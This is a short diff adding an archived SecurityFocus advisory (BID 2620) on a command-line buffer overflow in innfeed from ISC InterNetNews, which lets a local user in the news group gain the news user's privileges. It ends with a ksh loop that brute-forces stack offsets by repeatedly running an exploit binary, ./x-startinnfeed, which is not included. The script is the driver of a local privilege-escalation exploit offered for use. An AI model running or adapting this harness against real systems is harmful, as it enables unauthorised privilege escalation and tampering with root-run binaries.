@@ -1,0 +1,17 @@
+source: http://www.securityfocus.com/bid/2620/info
+ 
+The innfeed utility, part of ISC InterNetNews, has an exploitable buffer overflow in its command-line parser. Specifically, innfeed will overflow if an overly long -c option is passed to it.
+ 
+A local attacker in the news group could use this overflow to execute arbitary code with an effective userid of news, which could constitute an elevation in privileges, and the ability to alter news-owned binaries that could be run by root.
+ 
+Exploits are available against x86 Linux builds of innfeed. 
+
+#!/bin/ksh
+L=-2000
+O=40
+while [ $L -lt 12000 ]
+do
+echo $L
+L=`expr $L + 1`
+./x-startinnfeed $L
+done
